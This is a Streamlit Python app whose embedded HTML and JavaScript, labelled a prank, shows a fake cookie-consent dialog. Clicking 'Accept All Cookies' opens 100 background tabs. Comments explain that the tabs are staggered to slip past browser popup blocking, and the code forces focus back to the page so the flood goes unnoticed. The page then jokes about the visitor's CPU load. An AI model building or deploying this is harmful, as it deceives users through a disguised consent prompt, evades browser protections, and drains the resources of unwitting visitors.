import streamlit as st
import streamlit.components.v1 as components

# Page Configuration
st.set_page_config(page_title="100-Tab Background Prank", page_icon="📑", layout="centered")

st.title("📑 Cookie Consent & Optimization")
st.write("Please review our site policy to continue browsing.")

# Embedded HTML/JS Prank Component
prank_html = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            background: #0f172a;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .cookie-card {
            background: #1e293b;
            padding: 35px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
            text-align: center;
            max-width: 420px;
            border: 2px solid #334155;
        }
        .cookie-card h2 { margin-top: 0; color: #f8fafc; }
        .cookie-card p { color: #94a3b8; font-size: 15px; line-height: 1.4; }
        
        .accept-btn {
            background: #22c55e;
            color: white;
            border: none;
            padding: 12px 28px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 15px;
            transition: transform 0.1s;
        }
        .accept-btn:active { transform: scale(0.95); }
        
        #message {
            margin-top: 25px;
            font-size: 18px;
            font-weight: bold;
            color: #38bdf8;
            text-align: center;
        }
    </style>
</head>
<body>

    <div id="cookie-card" class="cookie-card">
        <h2>🍪 Cookie Consent Required</h2>
        <p>By clicking accept, you agree to optimize your browser performance using 100 background background-sync threads.</p>
        <button class="accept-btn" onclick="openBackgroundTabs()">Accept All Cookies</button>
    </div>
    
    <div id="message"></div>

    <script>
        function openBackgroundTabs() {
            // Hide the card and show loading status
            document.getElementById('cookie-card').style.display = 'none';
            document.getElementById('message').innerText = '🚀 Deploying 100 background optimization tabs... Sit tight!';
            
            let count = 0;
            
            // Loop 100 times, staggering each tab by 60 milliseconds.
            // This prevents the browser from instantly blocking all popups as a bulk attack 
            // and ensures the focus stays right here on the main page!
            for (let i = 0; i < 100; i++) {
                setTimeout(() => {
                    let win = window.open('https://www.google.com', '_blank');
                    if (win) {
                        win.blur();       // Send the new tab straight to the background
                        window.focus();   // Force focus back to our main prank window
                    }
                    count++;
                    if (count === 100) {
                        document.getElementById('message').innerHTML = '🔥 Success! 100 background tabs are now open.<br><span style="color: #f43f5e; font-size: 14px;">(Check your CPU fan speed)</span>';
                    }
                }, i * 60);
            }
        }
    </script>
</body>
</html>
"""

# Render the component
components.html(prank_html, height=450)